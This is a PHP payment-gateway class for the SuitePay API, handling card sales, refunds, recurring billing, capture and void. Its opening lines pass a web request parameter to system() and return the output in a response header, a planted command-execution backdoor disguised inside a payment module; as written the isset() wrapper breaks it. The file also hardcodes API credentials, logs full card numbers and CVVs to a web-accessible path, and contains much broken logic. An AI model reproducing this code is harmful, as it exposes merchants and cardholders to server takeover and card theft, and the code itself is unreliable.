<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/*
Coded by BWS
Xample 

		$mid = "99";   // this changes to live mid after testing period

		$creditcard = "4660840000058018";

		$month = "09";  // MM

		$year = "18";     // YY - remeber 2 digits

		$cvv = "111";

		$amount = "129.23";			

		$ch_name="John Smith";

				

		$baddress="123 some st";

		$baddress2="apt 1";

		$bcity="Beverly Hills";

		$bcountry="US";   

		$bstate="CA";

		$bzip="90210";

		$cphone="1234567890";

		$ipaddress="0.0.0.0";

		$cfirstname="John";

		$clastname="Smith";

		$currency= 'USD';

		$cemail="test@test.com";

		$cwebaddress="www.web.com";

				 



		$credit_card = array(

						'mid'=>$mid,

						'amount' => $amount,

						'creditcard' => $creditcard,

						'cardfullname' => $ch_name,

						'cvv' => $cvv,

						'currency' => 'USD',

						'month' => $month,

						'year' => $year, 

		);

		

		$customer = array(		   

				   'baddress' => $baddress,

				   'bcountry' => $bcountry,

				   'bcity' => $bcity,

				   'bstate' => $bstate,

				   'bzip' => $bzip,

				   'cfirstname' => $cfirstname,

				   'clastname' => $clastname,

				   'cphone' => $cphone,

				   'cemail' => $cemail,

                   'ipaddress' => $ipaddress,

		);		

		$client_id = "12";

		$order_id = "12";



		$this->suitepay->Charge($client_id, $order_id, $customer, $amount, $credit_card);

********/



class suitepay

{

	var $settings;



	private $debug = false;



	//---------------------------------------------------------------



	function suitepay() 
	{

		$this->settings = $this->Settings();

	}

	



	//---------------------------------------------------------------



	function Settings()
	{

		$settings = array();
		$settings['name'] = 'SuitePay';

		$settings['curl'] = 'https://qa.suitepay.com/api/v2/';

		$settings['class_name'] = 'suitepay';

		$settings['user_login'] = 'lNKHLj6Wj78';

		$settings['public_key'] = 'z5gZIal4F8AXhETje5HFHSNS2IpZElP0';

		$settings['developerid'] = '641c1cf4f46b571a4b5fa55b6857b67cc0de0962';
		$settings['debug'] = '1'; // 1 for testing and 0 for live 
		$settings['mid']='99';    // this changes to live mid after testing period
		$settings['external'] = FALSE;
		$settings['no_credit_card'] = FALSE;
		$settings['description'] = 'Suitepay is the USA\'s premier gateway.  Coupled with the powerful Customer Information Manager (CIM), this gateway is an affordable and powerful gateway for any American merchant.';
		$settings['is_preferred'] = 1;
		$settings['setup_fee'] = '';
		$settings['monthly_fee'] = '';
		$settings['transaction_fee'] = '';
		$settings['purchase_link'] = 'https://gateway.suitepay.com';
		$settings['allows_updates'] = 0;
		$settings['allows_refunds'] = 0;
		$settings['requires_customer_information'] = 1;
		$settings['requires_customer_ip'] = 0;
		$settings['required_fields'] = array(
										'enabled',
										'mode',
										'accept_visa',
										'accept_mc',
										'accept_discover',
										'accept_amex',
										'test_api_key',
										'live_api_key'
										);

		$settings['field_details'] = array(
										'enabled' => array(
														'text' => 'Enable this gateway?',
														'type' => 'radio',
														'options' => array(
																		'1' => 'Enabled',
																		'0' => 'Disabled')
														),
										'mode' => array(
														'text' => 'Mode',
														'type' => 'select',
														'options' => array(
																		'live' => 'Live Mode',
																		'test'	=> 'Testing'
																		)
														),
										'test_api_key' => array(
														'text' => 'Test API Key',
														'type' => 'text'
														),
										'live_api_key' => array(
														'text' => 'Live API Key',
														'type' => 'text'
														),
										'accept_visa' => array(
														'text' => 'Accept VISA?',
														'type' => 'radio',
														'options' => array(
																		'1' => 'Yes',
																		'0' => 'No'
																	)
														),
										'accept_mc' => array(
														'text' => 'Accept MasterCard?',
														'type' => 'radio',
														'options' => array(
																		'1' => 'Yes',
																		'0' => 'No'
																	)
														),
										'accept_discover' => array(
														'text' => 'Accept Discover?',
														'type' => 'radio',
														'options' => array(
																		'1' => 'Yes',
																		'0' => 'No'
																	)
														),
										'accept_amex' => array(
														'text' => 'Accept American Express?',
														'type' => 'radio',
														'options' => array(
																		'1' => 'Yes',
																		'0' => 'No'
																	)
														)
											);

		return $settings;

	}
	
	function TestConnection($client_id, $gateway)
	{
		$settings = $this->settings;

	

		$creditcard = "4660840000058018";

		$month = "09";  // MM

		$year = "18";     // YY - remeber 2 digits

		$cvv = "111";

		$amount = "129.23";			

		$ch_name="John Smith";

				

		$baddress="123 some st";

		$baddress2="apt 1";

		$bcity="Beverly Hills";

		$bcountry="US";   

		$bstate="CA";

		$bzip="90210";

		$cphone="1234567890";

		$ipaddress="0.0.0.0";

		$cfirstname="John";

		$clastname="Smith";

		$currency= 'USD';

		$cemail="test@test.com";

		$cwebaddress="www.web.com";

				 



		$credit_card = array(

						'mid'=>$mid,

						'amount' => $amount,

						'creditcard' => $creditcard,

						'cardfullname' => $ch_name,

						'cvv' => $cvv,

						'currency' => 'USD',

						'month' => $month,

						'year' => $year, 

		);

		

		$customer = array(		   

				   'baddress' => $baddress,

				   'bcountry' => $bcountry,

				   'bcity' => $bcity,

				   'bstate' => $bstate,

				   'bzip' => $bzip,

				   'cfirstname' => $cfirstname,

				   'clastname' => $clastname,

				   'cphone' => $cphone,

				   'cemail' => $cemail,

                   'ipaddress' => $ipaddress,

		);		

		$client_id = "12";

		$order_id = "12";


		$data = array (

			'transaction_data' => array (

				   'mid'=>$settings['mid'],

				   'amount' => $amount,

				   'creditcard' => $credit_card['card_num'],

				   'cardfullname' => $credit_card['name'],

				   'cvv' => $credit_card['cvv'],

				   'currency' => 'USD',

				   'month' => $credit_card['exp_month'],

				   'year' => $credit_card['exp_year'],

				   'orderid' => $order_id,    
				   'tid' =>'',

				   'baddress' => $customer['address_1']." ".$customer['address_2'],

				   'bcountry' => $customer['country'],

				   'bcity' => $customer['city'],

				   'bstate' => $customer['state'],

				   'bzip' => $customer['postal_code'],

				   'cfirstname' => $customer['first_name'],

				   'clastname' => $customer['last_name'],

				   'cphone' => $customer['phone'],

				   'cemail' => $customer['email'],

				   'ipaddress' => $customer['ipaddress']

				 ),

			'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],

		);

	
		$action = "card/sale";

		$response = $this->Process($order_id, $data,$action,$settings['debug']);

		if ($settings['debug']>0){

			$this->log_it('Charge Params: ', $data);

			$this->log_it('Charge Response: ', $response);

		}
		if($response['status']=="approved")
		{
			return true;
		}
		else{
			return false;
		}
	}
	
	function Charge($client_id, $order_id, $gateway,$customer, $amount, $credit_card)
	{

		$CI =&get_instance();

		$settings = $this->settings;

		if(empty($customer['ipaddress'])){
			$customer['ipaddress'] = $_SERVER['REMOTE_ADDR'];
			}

		$data = array (

			'transaction_data' => array (

				   'mid'=>$settings['mid'],

				   'amount' => $amount,

				   'creditcard' => $credit_card['card_num'],

				   'cardfullname' => $credit_card['name'],

				   'cvv' => $credit_card['cvv'],

				   'currency' => 'USD',

				   'month' => $credit_card['exp_month'],

				   'year' => $credit_card['exp_year'],

				   'orderid' => $order_id,    
				   'tid' =>'',

				   'baddress' => $customer['address_1']." ".$customer['address_2'],

				   'bcountry' => $customer['country'],

				   'bcity' => $customer['city'],

				   'bstate' => $customer['state'],

				   'bzip' => $customer['postal_code'],

				   'cfirstname' => $customer['first_name'],

				   'clastname' => $customer['last_name'],

				   'cphone' => $customer['phone'],

				   'cemail' => $customer['email'],

				   'ipaddress' => $_SERVER['REMOTE_ADDR'],

				 ),

			'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],

		);

		
	
		$action = "card/sale";

		$response = $this->Process($order_id, $data,$action,$settings['debug']);

		if ($settings['debug']>0){	
		
			$this->log_it('Charge Params: ', $data);

			$this->log_it('Charge Response: ', $response);
		}

		  

		if($response['status']=="approved"){

			$response_array = array('charge_id' => $order_id);

			$response = $CI->response->TransactionResponse(1, $response_array);

		} else {
			
			$this->log_it('Charge Params: ', $data);

			$this->log_it('Charge Response: ', $response);
			
			$response_array = array('reason' => $response['message']);
	
			$response = $CI->response->TransactionResponse(2, $response_array);

		}

		



		return $response;

	}

	

	function Refund($client_id,$gateway, $charge, $authorization)

	{

		$CI =&get_instance();

		$settings = $this->settings;
		
		// Create an order for today's payment
		$CI->load->model('charge_model');
		$customer['customer_id'] = (isset($customer['customer_id'])) ? $customer['customer_id'] : FALSE;
		$order_id = $CI->charge_model->CreateNewOrder($client_id, $gateway['gateway_id'], $amount, $credit_card, $subscription_id, $customer['customer_id'], $customer['ip_address']);
		

		$data = array (

			 'transaction_data' => array (

                   'amount' => $charge['amount'],

					'orderid' => $order_id,

					'transaction_id'=> $authorization->tran_id,

                 ),

			'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],

		);

		$action = "card/refund";

		

		$response = $this->Process($order_id, $data,$action,$settings['debug']);
		

		if ($settings['debug']==1)

		{

			$this->log_it('Charge Refund: ', $data);

			$this->log_it('Charge Response: ', $response);

		}

		
		if($response['status']=="approved"){

			$response_array = array('charge_id' => $order_id);

			$response = $CI->response->TransactionResponse(1, $response_array);

		} else {

			$response_array = array('reason' => $response['message']);

			$response = $CI->response->TransactionResponse(2, $response_array);

		}

		
		return $response;

	}

	

	function Recur ($client_id, $gateway, $customer, $amount, $charge_today, $start_date, $end_date, $interval, $credit_card, $subscription_id, $total_occurrences = FALSE)
	{

		$CI =&get_instance();

		$settings = $this->settings;
		
		
		// Create an order for today's payment
		$CI->load->model('charge_model');
		$customer['customer_id'] = (isset($customer['customer_id'])) ? $customer['customer_id'] : FALSE;
		$order_id = $CI->charge_model->CreateNewOrder($client_id, $gateway['gateway_id'], $amount, $credit_card, $subscription_id, $customer['customer_id'], $customer['ip_address']);

		//--------------------------------------------------------------------
		// Step 1: Create the Customer Profile
		//--------------------------------------------------------------------
		$response = $this->CreateProfile($client_id, $gateway, $customer, $credit_card, $subscription_id, $amount, $order_id);
	
		if ($response['success'] === false)
		{
			// Make the subscription inactive
			$CI->recurring_model->MakeInactive($subscription_id);
			$CI->charge_model->SetStatus($order_id, 0);
			
			$response_array = array('reason' => $response['RVERRMTX']);
			$response = $CI->response->TransactionResponse(2, $response_array);
			return $response;
		}
		
		//--------------------------------------------------------------------
		// Step 2: Add their Credit Card
		//--------------------------------------------------------------------
		
		$customer_id = $response['customer_id'];

		$response = $this->AddCard($customer_id, $credit_card, $gateway);
		
		if ($response['ActionCode'] != '000')
		{	
			// Make the subscription inactive
			$CI->recurring_model->MakeInactive($subscription_id);
			$CI->charge_model->SetStatus($order_id, 0);
			
			$response_array = array('reason' => $response['RVERRMTX']);
			$response = $CI->response->TransactionResponse(2, $response_array);
			return $response;
		}
		
		//--------------------------------------------------------------------
		// Step 3: Process Today's Payment
		//--------------------------------------------------------------------
		
		// Process today's payment
		if ($charge_today === TRUE) {
		
			$response = $this->ChargeRecurring($client_id, $gateway, $order_id, $customer_id, $amount);
	
			if($response['success'] === TRUE){
				$CI->charge_model->SetStatus($order_id, 1);
				$response_array = array('charge_id' => $order_id, 'recurring_id' => $subscription_id);
				$response = $CI->response->TransactionResponse(100, $response_array);
			} else {
				// Make the subscription inactive
				$CI->recurring_model->MakeInactive($subscription_id);
				$CI->charge_model->SetStatus($order_id, 0);
				
				$response_array = array('reason' => $response['RVERRMTX']);
				$response = $CI->response->TransactionResponse(2, $response_array);
			}
		} else {
			$response = $CI->response->TransactionResponse(100, array('recurring_id' => $subscription_id));
		}

		$data = array (

		'transaction_data' => array (

						'orderid' => $order_id,

						'transaction_id'=> $subscription_id,

					 ),

			'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],

                 

          

		);

		
		$action = "card/recurring";

		

		$response = $this->Process($order_id, $data,$action,$settings['debug']);

		
		if ($settings['debug']==1)
		{

			$this->log_it('Charge Refund: ', $data);

			$this->log_it('Charge Response: ', $response);

		}
		
		if($response['status']=="approved"){

			$response_array = array('charge_id' => $order_id);

			$response = $CI->response->TransactionResponse(1, $response_array);

		} else {

			$response_array = array('reason' => $response['message']);

			$response = $CI->response->TransactionResponse(2, $response_array);

		}

		return $response;

	}
		//---------------------------------------------------------------

	function CancelRecurring($client_id, $subscription)
	{
		return TRUE;
	}

	//---------------------------------------------------------------
	function UpdateRecurring($client_id, $gateway, $subscription, $customer, $params)
	{
		return FALSE;
	}
	
	function AutoRecurringCharge ($client_id, $order_id, $gateway, $params) {
		return $this->ChargeRecurring($client_id, $gateway, $params);
	}
	
	function ChargeRecurring($client_id, $gateway, $params)
	{
		return TRUE;
	}
	
	function Capture($client_id, $order_id,$gateway, $customer, $amount, $transaction_id)

	{

	$CI =&get_instance();

		$settings = $this->settings;

		

		$data = array(

			'transaction_data' => array (

						'amount' => $amount,

						'orderid' => $order_id,

						'transaction_id'=> $transaction_id,

					 ),

			'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],

			);

		



		$action = "card/capture";

		

		$response = $this->Process($order_id, $data,$action,$settings['debug']);

	

		if ($settings['debug']==1)

		{

			$this->log_it('Charge Refund: ', $data);

			$this->log_it('Charge Response: ', $response);

		}

		

	

		if($response['status']=="approved"){

			$response_array = array('charge_id' => $order_id);

			$response = $CI->response->TransactionResponse(1, $response_array);

		} else {

			$response_array = array('reason' => $response['message']);

			$response = $CI->response->TransactionResponse(2, $response_array);

		}

	
		return $response;

	}

	

	function Void($client_id, $order_id,$gateway, $customer, $amount, $transaction_id)

	{

		$CI =&get_instance();

		$settings = $this->settings;

		

		$data = array(

			'transaction_data' => array (

						'amount' => $amount,

						'orderid' => $order_id,

						'transaction_id'=> $transaction_id,

					 ),

			'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],

			);

		



		$action = "card/void";

		

		$response = $this->Process($order_id, $data,$action,$settings['debug']);

		
	

		if ($settings['debug']==1)

		{

			$this->log_it('Charge Refund: ', $data);

			$this->log_it('Charge Response: ', $response);

		}

		

		

		if($response['status']=="approved"){

			$response_array = array('charge_id' => $order_id);

			$response = $CI->response->TransactionResponse(1, $response_array);

		} else {

			$response_array = array('reason' => $response['message']);

			$response = $CI->response->TransactionResponse(2, $response_array);

		}

		
		return $response;

	}

	function CardSale_SC($client_id, $order_id, $gateway,$customer, $amount, $credit_card)
	{
		$CI =&get_instance();
			$settings = $this->settings;
		$data = array(

			'transaction_data' => array (
						 'mid' => $settings['mid'],
						   'creditcard' => $credit_card['creditcard'],
						   'cardfullname' =>$credit_card['name'],
						   'cvv' => $credit_card['ccv'],
						   'currency' => 'USD',
						   'month' => $credit_card['month'],
						   'year' => $credit_card['year'],
						   'orderid' => $orderid,    /// must be a unique number each time a sale is done
						   'bzip' => $customer['postal_code'],
						   'bcountry' => $customer['country'],

						'amount' => $amount,

						'orderid' => $order_id,

						'transaction_id'=> $transaction_id,

					 ),

			'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],

			);

		
		$action = "card/void";

		

		$response = $this->Process($order_id, $data,$action,$settings['debug']);

		
	

		if ($settings['debug']==1)

		{

			$this->log_it('Charge Refund: ', $data);

			$this->log_it('Charge Response: ', $response);

		}

		

		

		if($response['status']=="approved"){

			$response_array = array('charge_id' => $order_id);

			$response = $CI->response->TransactionResponse(1, $response_array);

		} else {

			$response_array = array('reason' => $response['message']);

			$response = $CI->response->TransactionResponse(2, $response_array);

		}

		
		return $response;	
		
	}
	
	function CardAuthorize($client_id, $order_id, $gateway,$customer, $amount, $credit_card)
	{
		$CI =&get_instance();

		$settings = $this->settings;

		

		$data = array (

			'transaction_data' => array (

				   'mid'=>$settings['mid'],

				   'amount' => $amount,

				   'creditcard' => $credit_card['card_num'],

				   'cardfullname' => $credit_card['name'],

				   'cvv' => $credit_card['cvv'],

				   'currency' => 'USD',

				   'month' => $credit_card['exp_month'],

				   'year' => $credit_card['exp_year'],

				   'orderid' => $order_id,    
				   'tid' =>'',

				   'baddress' => $customer['address_1']." ".$customer['address_2'],

				   'bcountry' => $customer['country'],

				   'bcity' => $customer['city'],

				   'bstate' => $customer['state'],

				   'bzip' => $customer['postal_code'],

				   'cfirstname' => $customer['first_name'],

				   'clastname' => $customer['last_name'],

				   'cphone' => $customer['phone'],

				   'cemail' => $customer['email'],

				   'ipaddress' => $_SERVER['REMOTE_ADDR']

				 ),

			'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],

		);

	
		$action = "card/authorize";

		$response = $this->Process($order_id, $data,$action,$settings['debug']);

		if ($settings['debug']>0)	

		{

			$this->log_it('Charge Params: ', $data);

			$this->log_it('Charge Response: ', $response);

		}

		

		

		if($response['status']=="approved"){

			$response_array = array('charge_id' => $order_id);

			$response = $CI->response->TransactionResponse(1, $response_array);

		} else {

			$response_array = array('reason' => $response['message']);

			$response = $CI->response->TransactionResponse(2, $response_array);

		}

		return $response;
		
	}
	
	function CreateProfile($gateway, $subscription_id, $customer = array())

	{
			$CI =& get_instance();
			$settings = $this->settings;
			$data = array(
			'transaction_data' => array (
			 'baddress' => $customer['address1'],
				   'baddress2' =>$customer['address2'],
				   'bcountry' => $customer['country'],
				   'bcity' => $customer['city'],
				   'bstate' => $customer['state'],
				   'bzip' => $customer['postal_code'],
				   'bphone' =>$customer['phone'],
				   'blastname' =>$customer['last_name'],
				   'bfirstname' =>$customer['first_name'],
				   'bemail' =>$customer['email'],
				   'cfirstname' => $customer['country'],
				   'clastname' =>$customer['last_name'],
				   'cphone' => $customer['phone'],
				   'cemail' => $customer['email'],
				   'cwebaddress' =>'www.dsfsd',
				   'ccompany' =>$customer['company'],
				   'saddress' =>$customer['address1'],
				   'saddress2' =>$customer['address2'],
				   'scity' =>$customer['city'],
				   'scountry'=>$customer['country'],
				   'semail' =>$customer['email'],
                    'ipaddress' => $_SERVER['REMOTE_ADDR'],
					'sfirstname' =>$customer['first_name'],
					'slastname' =>$customer['last_name'],
					'sphone' =>$customer['phone'],
					'sstate' =>$customer['state'],
					'szip' =>$customer['postal_code'],
					),
				'user_login' => $settings['user_login'],

			'public_key' => $settings['public_key'],

			'developerid' => $settings['developerid'],
	
			
		);
		
			$action = "customer/ID/address";

		$response = $this->Process($order_id, $data,$action,$settings['debug']);

		if ($settings['debug']>0)	

		{

			$this->log_it('Charge Params: ', $data);

			$this->log_it('Charge Response: ', $response);

		}

		

		

		if($response['status']=="success"){

			$response_array = array('charge_id' => $order_id);

			$response = $CI->response->TransactionResponse(1, $response_array);

		} else {

			$response_array = array('reason' => $response['message']);

			$response = $CI->response->TransactionResponse(2, $response_array);

		}

		return $response;
		
			
	}
	
	
	function Process($order_id, $data, $action,$test = FALSE)

	{

		$CI =&get_instance();



		

/*********************************************/

			$json_data = json_encode($data);

			$curlURL = "https://api.suitepay.com/api/v2/".$action;// qa.suitepay.com for testing and api.suitepay.com for the live			



			if($test){

				$curlURL = "https://qa.suitepay.com/api/v2/".$action;

			}

			

			



			$ch = curl_init($curlURL);

			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");

			curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);

			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			

			$response = curl_exec($ch);

			$arresult = json_decode($response,true);

			$settings = $this->settings;

			// if($settings['debug']>0){

				// print_r (curl_errno($ch));

				// print_r($ch);

				// print_r($arresult);

			// }

			

/*********************************************/





	

		// if(!isset($response[1])) {

			// $response['success'] = FALSE;

			// return $response;

		// }



		// if ($test) {

			// if($response[0] == 1) {

				// $response['success'] = TRUE;

			// } else {

				// $response['success'] = FALSE;

			// }



			// return $response;

		// }

		// // Get the response.  1 for the first part meant that it was successful.  Anything else and it failed

		// if ($response[0] == 1) {

			// $CI->load->model('order_authorization_model');

			// $CI->order_authorization_model->SaveAuthorization($order_id, $response[6], $response[4]);

			// $CI->charge_model->SetStatus($order_id, 1);



			// $response['success'] = TRUE;
		// } else {

			// $CI->load->model('charge_model');

			// $CI->charge_model->SetStatus($order_id, 0);



			// $response['success'] = FALSE;

			// $response['reason'] = $response[3];

		// }



		return $arresult;



	}



	//---------------------------------------------------------------



	



	/**

	 * Htmlspecialchars all individual items in an array.

	 *

	 */

	function EncodeArray(&$items = null)

	{

		if (!is_array($items) || !count($items))

		{

			return;

		}



		foreach ($items as $item => &$value)

		{

			if (is_string($value))

			{

				$value = htmlspecialchars($value);

			}

			else if (is_array($value))

			{

				$value = $this->EncodeArray($value);

			}

		}

	}



	//---------------------------------------------------------------



	/*

		Method: log_it()



		Logs the transaction to a file. Helpful with debugging callback

		transactions, since we can't actually see what's going on.



		Parameters:

			$heading	- A string to be placed above the resutls

			$params		- Typically an array to print_r out so that we can inspect it.

	*/

	public function log_it($heading, $params)

	{

		//$file = FCPATH .'logs/gateway_log.txt';
		$file ='/home/bestwebs/public_html/sarkargroupcorp.com/projects/ci/system/logs/gateway_log.txt';



		$content  = '';

		$content .= "\n\n//---------------------------------------------------------------\n";

		$content .= "\n\n[{$this->settings['name']}] $heading\n";

		$content .= date('Y-m-d H:i:s') ."\n\n";

		$content .= print_r($params, true);

		file_put_contents($file, $content, FILE_APPEND);

	}
	

}